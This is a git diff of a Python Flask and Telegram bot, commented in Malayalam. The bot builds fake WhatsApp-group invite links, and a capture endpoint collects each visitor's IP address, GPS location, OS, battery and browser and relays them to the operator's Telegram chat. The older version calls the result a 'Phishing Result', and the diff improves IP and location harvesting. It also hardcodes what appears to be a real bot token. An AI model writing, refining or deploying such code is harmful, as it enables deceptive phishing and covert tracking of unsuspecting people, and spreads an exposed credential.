@@ -6,12 +6,8 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 # --- സെറ്റിംഗ്സ് ---
-# GitHub-ൽ അപ്‌ലോഡ് ചെയ്യുമ്പോൾ ടോക്കൺ സുരക്ഷിതമായി വെക്കാൻ os.getenv ഉപയോഗിക്കുന്നു
 TOKEN = os.getenv('BOT_TOKEN', '8619342353:AAHJRIZvlj1weBM6jkLUWAHDeo6eNoBcR18')
-
-# Render അല്ലെങ്കിൽ മറ്റ് സർവർ നൽകുന്ന URL ഇവിടെ നൽകണം
-# ഉദാഹരണത്തിന്: 'https://your-app-name.onrender.com'
-BASE_URL = os.getenv('BASE_URL', 'YOUR_URL_HERE') 
+BASE_URL = os.getenv('BASE_URL', 'https://hackbot2-0.onrender.com') 
 
 app = Flask(__name__)
 
@@ -21,7 +17,6 @@ app = Flask(__name__)
 def join():
     group_name = request.args.get('group', 'WhatsApp Group')
     chat_id = request.args.get('id')
-    # templates/index.html ലോഡ് ചെയ്യുന്നു
     return render_template('index.html', group_name=group_name, chat_id=chat_id)
 
 @app.route('/capture', methods=['POST'])
@@ -29,45 +24,53 @@ def capture():
     data = request.json
     chat_id = data.get('chat_id')
     
-    # ലഭിച്ച വിവരങ്ങൾ വൃത്തിയായി ഫോർമാറ്റ് ചെയ്യുന്നു
+    # യഥാർത്ഥ ഐപി അഡ്രസ്സ് കണ്ടുപിടിക്കുന്നു (Render-ൽ ഇത് ആവശ്യമാണ്)
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    lat = data.get('lat')
+    lon = data.get('lon')
+    
+    # ലൊക്കേഷൻ പെർമിഷൻ ഉണ്ടെങ്കിൽ മാത്രം ഗൂഗിൾ മാപ്പ് ലിങ്ക് ഉണ്ടാക്കുന്നു
+    if lat != "Denied" and lon != "Denied":
+        location_link = f"https://www.google.com/maps?q={lat},{lon}"
+    else:
+        location_link = "❌ പെർമിഷൻ നൽകിയിട്ടില്ല"
+
+    # വിവരങ്ങൾ വരിവരിയായി അടുക്കി ഫോർമാറ്റ് ചെയ്യുന്നു
     report = (
-        f"🎯 **Phishing Result Received!** 🎯\n\n"
-        f"📱 **OS:** {data.get('platform')}\n"
-        f"🔋 **Battery:** {data.get('battery')}\n"
-        f"🌐 **Browser:** {data.get('browser')[:60]}...\n"
-        f"📡 **IP Address:** {request.remote_addr}\n"
-        f"📍 **Location:** https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
+        f"🎯 **പുതിയ റിസൾട്ട് ലഭിച്ചു!** 🎯\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 **OS:** `{data.get('platform')}`\n"
+        f"🔋 **Battery:** `{data.get('battery')}`\n"
+        f"📡 **IP Address:** `{user_ip}`\n"
+        f"🌐 **Browser:** `{data.get('browser')[:50]}...`\n"
+        f"📍 **Location:** [ഇവിടെ ക്ലിക്ക് ചെയ്യുക]({location_link})\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
     )
     
-    # ടെലിഗ്രാമിലേക്ക് റിപ്പോർട്ട് അയക്കുന്നു
+    # ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
     send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     requests.post(send_url, data={'chat_id': chat_id, 'text': report, 'parse_mode': 'Markdown'})
     
     return jsonify({"status": "success"})
 
 def run_flask():
-    # ക്ലൗഡ് സർവറുകൾ നൽകുന്ന പോർട്ട് ഉപയോഗിക്കുന്നു
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
 # --- ടെലിഗ്രാം ബോട്ട് ഭാഗം ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋\ngroup name type cheyy"
-    )
+    await update.message.reply_text("👋\nWhatsApp ഗ്രൂപ്പിന്റെ പേര് ടൈപ്പ് ചെയ്യൂ അളിയാ...")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     group_name = update.message.text
     chat_id = update.message.chat_id
     
-    # സ്പെയിസ് മാറ്റാൻ URL Encoding
     safe_group_name = group_name.replace(' ', '%20')
     invite_link = f"{BASE_URL}/join?group={safe_group_name}&id={chat_id}"
     
-    await update.message.reply_text(
-        f"✅ ready ayi aliyaa\n\n\n\n{invite_link}"
-    )
+    await update.message.reply_text(f"✅ ലിങ്ക് റെഡി ആയി അളിയാ...\n\n{invite_link}")
 
 def run_bot():
     application = ApplicationBuilder().token(TOKEN).build()
@@ -78,11 +81,9 @@ def run_bot():
 # --- മെയിൻ റണ്ണിംഗ് ഭാഗം ---
 
 if __name__ == '__main__':
-    # സർവർ ബാക്ക്ഗ്രൗണ്ടിൽ റൺ ചെയ്യുന്നു
     t = threading.Thread(target=run_flask)
     t.daemon = True
     t.start()
     
-    # ബോട്ട് റൺ ചെയ്യുന്നു
     print("ബോട്ട് സജ്ജമാണ്...")
     run_bot()
